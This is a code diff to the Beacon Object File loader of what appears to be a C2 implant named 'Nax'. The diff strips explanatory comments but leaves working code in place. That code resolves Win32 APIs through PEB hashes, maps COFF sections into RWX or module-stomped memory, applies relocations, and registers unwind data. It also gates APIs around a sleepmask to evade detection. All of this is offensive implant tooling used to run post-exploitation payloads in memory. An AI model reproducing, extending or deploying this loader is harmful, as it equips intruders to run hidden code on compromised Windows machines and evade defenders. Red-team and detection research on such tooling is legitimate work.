@@ -12,9 +12,6 @@
 #include "Common.h"
 #include "Bof.h"
 
-/* ---- pull in Api.c and Stomp.c as part of this translation unit ----
- * Define unity-build guard so their Macros.h/Instance.h guards are skipped
- * (they're already in scope from the includes above). */
 #define _NAX_BOF_UNITY_BUILD_
 #include "Api.c"
 #include "Stomp.c"
@@ -29,8 +26,6 @@ static PCHAR SymName( PCOF_SYMBOL sym, PCHAR strtab ) {
     return sym->cName;
 }
 
-/* NaxHashStrMod: FNV1a-32 of 'len' bytes from str, lowercased, then ".dll" appended.
- * Used to match BOF Win32 symbol module names (e.g. "KERNEL32") against the PEB. */
 static UINT32 NaxHashStrMod( const PCHAR str, UINT32 len ) {
     UINT32 h = 0x811C9DC5u;
     for ( UINT32 i = 0; i < len; i++ ) {
@@ -49,8 +44,6 @@ static UINT32 NaxHashStrMod( const PCHAR str, UINT32 len ) {
 
 /* ========= [ Beacon API table ] ========= */
 
-/* Macro forces separate runtime lea/mov per entry - never uses compound literal
- * struct init which the compiler may lay out in .data with link-time addresses. */
 #define _API(i, h, fn) do { tbl[(i)].Hash = (h); tbl[(i)].Proc = (PVOID)(fn); } while(0)
 
 static VOID NaxBofInitApiTable( NAX_BOF_API* tbl, PNAX_INSTANCE Nax ) {
@@ -83,10 +76,8 @@ static VOID NaxBofInitApiTable( NAX_BOF_API* tbl, PNAX_INSTANCE Nax ) {
     _API( 24, H_BOF_GETPROCADDRESS,       Nax->Kernel32.GetProcAddress   );
     _API( 25, H_BOF_GETMODULEHANDLEA,     Nax->Kernel32.GetModuleHandleA );
     _API( 26, H_BOF_FREELIBRARY,          Nax->Kernel32.FreeLibrary      );
-    /* async BOF APIs */
     _API( 27, H_BOF_BEACONWAKEUP,          BeaconWakeup          );
     _API( 28, H_BOF_BEACONGETSTOPJOBEVENT,  BeaconGetStopJobEvent );
-    /* key-value store */
     _API( 29, H_BOF_BEACONADDVALUE,        BeaconAddValue        );
     _API( 30, H_BOF_BEACONGETVALUE,        BeaconGetValue        );
     _API( 31, H_BOF_BEACONREMOVEVALUE,     BeaconRemoveValue     );
@@ -112,9 +103,6 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
     UINT32 mod_len = 0;
     while ( sym_name[ mod_len ] && sym_name[ mod_len ] != '$' ) mod_len++;
     if ( sym_name[ mod_len ] != '$' ) {
-        /* Bare Win32 symbol (no MODULE$ prefix) - try kernel32 via GetProcAddress.
-         * Handles __imp_* symbols from <windows.h> declarations that aren't in the
-         * beacon API table (e.g. HeapAlloc, VirtualAlloc, etc.). */
         PVOID proc = Nax->Kernel32.GetProcAddress( Nax->Kernel32.Handle, sym_name );
         NaxDbg( Nax, "[bof] sym '%s' -> bare k32 fallback %p", sym_name, proc );
         return proc;
@@ -125,7 +113,6 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
 
     PVOID hMod = NaxGetModule( mod_hash );
     if ( !hMod ) {
-        /* Build lowercase CHAR module name for LoadLibraryA */
         CHAR mod_buf[64];
         UINT32 i;
         for ( i = 0; i < mod_len && i < 59; i++ ) {
@@ -144,9 +131,6 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
         return NULL;
     }
 
-    /* GetProcAddress handles forwarded exports (e.g. ole32!CreateStreamOnHGlobal →
-     * combase) that NaxGetProc misses when the target module isn't pre-loaded.
-     * BOF symbol names are available as strings so no hash lookup is needed. */
     PVOID proc = Nax->Kernel32.GetProcAddress( hMod, func_name );
     NaxDbg( Nax, "[bof] sym '%s' -> %p (mod=%p)", sym_name, proc, hMod );
     return proc;
@@ -154,17 +138,8 @@ static PVOID NaxBofResolveExternal( PNAX_INSTANCE Nax, PCHAR sym_name,
 
 /* ========= [ section allocation ] ========= */
 
-/* NON-STOMP: MEM_TOP_DOWN places all sections near the DLLs at 0x7FF9... so
- * that REL32 displacements stay within ±2 GB.  STOMP: NaxBofStompAlloc uses
- * StompAllocNear to place non-.text sections + mapFunctions adjacent to the
- * DLL image (also within ±2 GB).
- * image_base = MINIMUM section address so all ADDR32NB RVAs are non-negative. */
 #define BOF_ALLOC_FLAGS (MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN)
 
-/* Allocate mapFunctions AFTER sections so all allocations land in the same
- * memory region.  Allocating it first (with MEM_TOP_DOWN) places it at
- * 0x7FF8... while sections land at 0x1ECEC... - 6TB apart, 32-bit REL32
- * overflows.  Allocating last keeps everything within ~400KB of each other. */
 static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
                                  PCOF_HEADER hdr, PCOF_SECTION sections,
                                  PVOID* mapSections, PVOID* mf_out,
@@ -211,18 +186,10 @@ static INT NaxBofAllocSections( PNAX_INSTANCE Nax, PBYTE bof,
         }
 
         mapSections[i] = base;
-
-        /* Copy raw bytes for ALL sections that have them, including writable (.data).
-         * NtAllocateVirtualMemory zero-initialises; for .bss-style sections
-         * (raw=0, virt>0) there is nothing to copy and they stay zeroed.
-         * Do NOT skip writable sections: initialized globals belong in .data and
-         * zeroing them corrupts the BOF's startup state. */
         if ( s->PointerToRawData && raw_size )
             MmCopy( base, bof + s->PointerToRawData, raw_size );
     }
 
-    /* Allocate mapFunctions AFTER all sections so it lands in the same
-     * memory region (within ~400 KB of .text, safe for 32-bit REL32). */
     PVOID  mf  = NULL;
     SIZE_T mfs = 4096;
     Nax->Ntdll.NtAllocateVirtualMemory( NtCurrentProcess(), &mf, 0, &mfs, BOF_ALLOC_FLAGS, PAGE_EXECUTE_READWRITE );
@@ -252,10 +219,6 @@ static VOID NaxBofCleanupSections( PNAX_INSTANCE Nax, PVOID* mapSections,
 }
 
 /* ========= [ relocation processing ] ========= */
-
-/* mapFunctions: MEM_TOP_DOWN buffer for external-symbol IAT slots.
- * External REL32 calls (FF 15, __imp__*) patch the displacement to point here.
- * *mf_idx tracks the next free 8-byte slot. */
 static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                                      PCOF_HEADER hdr, PCOF_SECTION sections,
                                      PCOF_SYMBOL symtab, PCHAR strtab,
@@ -286,7 +249,6 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
             } else {
                 PCHAR name = SymName( sym, strtab );
 
-                /* Skip __imp_ prefix (6 bytes) */
                 if ( name[0] == '_' && name[1] == '_' &&
                      name[2] == 'i' && name[3] == 'm' &&
                      name[4] == 'p' && name[5] == '_' )
@@ -301,19 +263,12 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                 }
             }
 
-            /* Apply relocation patch */
             switch ( r->Type ) {
 #if defined(__x86_64__) || defined(_WIN64)
             case IMAGE_REL_AMD64_ADDR64:
                 *((UINT64*)loc) += (UINT64)(ULONG_PTR)sym_addr;
                 break;
             case IMAGE_REL_AMD64_ADDR32NB: {
-                /* RVA relative to image_base (the lowest allocated section address).
-                 * Using the minimum address ensures all RVAs are non-negative UINT32.
-                 * With MEM_TOP_DOWN, .text is at the HIGHEST address; using mapSections[0]
-                 * instead would produce negative values for all sections below .text,
-                 * which corrupts .pdata RUNTIME_FUNCTION UnwindInfoAddress entries and
-                 * makes exception dispatch crash rather than unwind correctly. */
                 INT32 cur;
                 MmCopy( &cur, loc, 4 );
                 cur += (INT32)( (ULONG_PTR)sym_addr - image_base );
@@ -328,10 +283,6 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
             case IMAGE_REL_AMD64_REL32_5: {
                 UINT32 delta  = r->Type - IMAGE_REL_AMD64_REL32;
                 INT32  addend = 0;
-                /* COFF spec: the 4 bytes at the relocation site are a signed addend.
-                 * Both COFFLoader and Kharon include it in the displacement formula.
-                 * Omitting it produces wrong addresses for any non-zero addend
-                 * (e.g. RIP-relative access to the middle of a static array). */
                 MmCopy( &addend, loc, 4 );
 
                 PVOID target;
@@ -339,10 +290,6 @@ static INT NaxBofProcessRelocations( PNAX_INSTANCE Nax, PBYTE bof,
                 if ( sym->SectionNumber > 0 || !mapFunctions ) {
                     target = sym_addr;
                 } else {
-                    /* External symbol via __imp_* (DECLSPEC_IMPORT, FF15 indirect call).
-                     * Store the 64-bit function VA in the next mapFunctions slot.
-                     * The disp32 points to that slot - one extra indirection, but the
-                     * slot is in the same TOP_DOWN range so the ±2 GB limit is safe. */
                     if ( *mf_idx < 512 ) {
                         mapFunctions[ *mf_idx ] = (UINT64)(ULONG_PTR)sym_addr;
                         target = (PVOID)( mapFunctions + *mf_idx );
@@ -443,9 +390,6 @@ FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
     }
     NaxDbg( Nax, "[bof] step 1: alloc OK (stomped=%d)", (INT)stomped );
 
-    /* Compute image_base = lowest allocated section address.
-     * MEM_TOP_DOWN gives .text (sec[0]) the highest address; all other sections
-     * are below it.  image_base is the floor so all ADDR32NB RVAs are positive. */
     ULONG_PTR image_base = (ULONG_PTR)~0ULL;
     for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
         if ( mapSections[i] && (ULONG_PTR)mapSections[i] < image_base )
@@ -468,9 +412,7 @@ FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
     }
     NaxDbg( Nax, "[bof] reloc OK (mapFunctions used=%u slots)", mf_idx );
 
-    /* ---- 3. register BOF .pdata for clean stack unwinding (stomp) ----
-     * Must run BEFORE NaxBofStompProtect flips .text to RX, because
-     * NaxBofStompPdata copies xdata into the tail of the .text section. */
+    /* ---- 3. register BOF .pdata for clean stack unwinding (stomp) ---- */
     PRUNTIME_FUNCTION pdataTable = NULL;
     DWORD pdataCount = 0;
     BOOL  pdataInDll = FALSE;
@@ -483,7 +425,6 @@ FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
                 pdataTable = (PRUNTIME_FUNCTION)mapSections[pi];
                 pdataCount = ps->SizeOfRawData / sizeof( RUNTIME_FUNCTION );
 
-                /* Locate xdata section via first .pdata entry's UnwindData */
                 PVOID xdataBase = NULL;
                 ULONG xdataSize = 0;
                 ULONG_PTR firstUnwindVA = image_base + pdataTable[0].UnwindData;
@@ -516,8 +457,6 @@ FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
         NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
         NaxDbg( Nax, "[bof] step 3b: stomp protections OK (.text=RX, rest=RW)" );
     } else {
-        /* Blanket RWX - fine-grained RX/RO crashes: unwind machinery may write
-         * through .pdata/.xdata before control reaches the first BOF call. */
         NaxDbg( Nax, "[bof] step 3b: set PAGE_EXECUTE_READWRITE on all sections" );
         for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ ) {
             if ( !mapSections[i] ) continue;
@@ -543,7 +482,6 @@ FUNC INT NaxBofExecute( PNAX_INSTANCE Nax,
     }
     NaxDbg( Nax, "[bof] entry OK: %p", entry );
 
-    /* Record stomp metadata for operator feedback */
     NAX_JOB* curJob = NaxFindCurrentJob( Nax );
     NAX_BOF_CTX* stompCtx = curJob ? &curJob->BofCtx : &Nax->BofCtx;
     stompCtx->Stomped   = stomped ? 0x01 : 0x00;
@@ -637,7 +575,6 @@ FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
     UINT32 mf_idx  = 0;
     BOOL   stomped = FALSE;
 
-    /* Route alloc/protect/pdata/free to the dedicated SmSlot */
     Nax->BofStompPool.SmStompReq = TRUE;
 
     if ( NaxBofAllocSections( Nax, bof, hdr, sections, mapSections, &mf_base, &stomped ) != NAX_OK ) {
@@ -663,7 +600,6 @@ FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
         return NULL;
     }
 
-    /* register .pdata */
     PRUNTIME_FUNCTION pdataTable = NULL;
     DWORD pdataCount = 0;
     BOOL  pdataInDll = FALSE;
@@ -698,7 +634,6 @@ FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
         }
     }
 
-    /* set protections */
     if ( stomped ) {
         NaxBofStompProtect( Nax, mapSections, hdr->NumberOfSections, sections );
     } else {
@@ -712,7 +647,6 @@ FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
         }
     }
 
-    /* find named symbol */
     PVOID entry = NaxBofFindSymbol( Nax, hdr, symtab, strtab, mapSections, sym_name );
     if ( !entry ) {
         if ( pdataTable && !pdataInDll ) Nax->Ntdll.RtlDeleteFunctionTable( pdataTable );
@@ -724,7 +658,6 @@ FUNC PVOID NaxBofLoadResident( PNAX_INSTANCE Nax,
 
     Nax->BofStompPool.SmStompReq = FALSE;
 
-    /* persist state for later cleanup */
     for ( UINT16 i = 0; i < hdr->NumberOfSections && i < BOF_MAX_SECTIONS; i++ )
         Nax->ResidentSections[i] = mapSections[i];
     Nax->ResidentNumSections = hdr->NumberOfSections;
@@ -745,11 +678,6 @@ FUNC VOID NaxBofFreeResident( PNAX_INSTANCE Nax ) {
 
     NaxDbg( Nax, "[bof-resident] freeing" );
 
-    /* Un-gate APIs BEFORE cleanup - NaxBofStompFree calls VirtualProtect
-       on the SmSlot .text where the sleepmask code lives.  If VP is gated
-       the sleepmask would VirtualProtect its own page to RW, removing
-       execute permission, then DEP-crash on the next instruction.
-       NaxSleepmaskWire re-gates them when a new BOF is loaded. */
     NaxGateUnwireAll( Nax );
 
     /* Route cleanup to SmSlot if the resident was stomped there */
